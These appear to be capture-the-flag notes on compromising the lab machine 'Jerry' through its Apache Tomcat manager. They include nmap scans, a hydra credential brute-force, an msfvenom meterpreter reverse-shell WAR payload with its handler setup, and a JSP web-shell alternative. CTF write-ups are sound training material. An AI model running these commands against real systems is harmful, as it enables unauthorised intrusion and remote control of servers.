#### Target
10.10.10.95

#### Steps
1. nmap -sC -sV -Pn 10.10.10.95


nmap -sC -sV -oA nmap/jerry 10.10.10.95
-> 8080 http apache tomcat/coyote jsp engine 1.1
-> open 10.10.10.95:8080

/manager/server status -> auth req -> admin:admin (things about tomcat)
/manager/html/list -> 403
/manager/html 	-> 403 (configuration are explain on the 403 page, there are some default username:password base on the documentation also steps to configure) if no default was given then do bruteforce
			-> seclists (apt install seclists) -> find . | get -i tomcat (find from current directory then find 'tomcat' with no case sensitivity)
			-> hydra (bruteforce util) -> hydra -C {found file before using seclist} http-get://10.10.10.95:8080/manager/html(specify what to brute force) 
				-> HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C {found file before using seclist} http-get://10.10.10.95:8080/manager/html (look at burp HTTP history (this show how hydra try all the seclist user:password to bruteforce)) -> filter http history with no 4xx status code -> only 2 left from /manager/html that left which admin:admin and tomcat:s3cret
				-> better way to do -> HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C {found file before using seclist} -s 8080 10.10.10.95 http-get /manager/html -> using tomcat:s3cret /manager/html can be accessed
		-> authorization (decode as base64 (basic http auth, use burp to decode))
		-> inside /manager/html there are deploy option to upload a WAR file / deploy directory or WAR file located on server, and then a application table, which contain list of uploaded WAR files !!-> there is a possibility to upload a WAR file than execute the code to get shell
			-> msfvenom -l payloads -> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f war -o uploadThis.war && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=9001 -f war -o uploadThis2.war (bigger file) (to compare stage and stage lists payloads)
			-> msfdbrun -> search multi/handler -> use explit/multi/handler -> set payload windows/x64/meterpreter/reverse_tcp -> set LHOST tun0 -> set LPORT 9001 -> exploit -j
			-> upload .war file -> manually go to .jsp in browser -> sessions -i 1 -> getuid -> shell --> user flag GET




2nd SOLUTION
find jsp shell
-> git clone securitRiskAdvisor -> vi cmd.jsp -> remove eval statement, change to src="eth0/a.js" -> rm cmd.war -> zip cmd.war cmd.jsp
-> python -m SimpleHTTPServer 80
-> upload the cmd.war file -> specify the cmd.jsp

silent trinity github

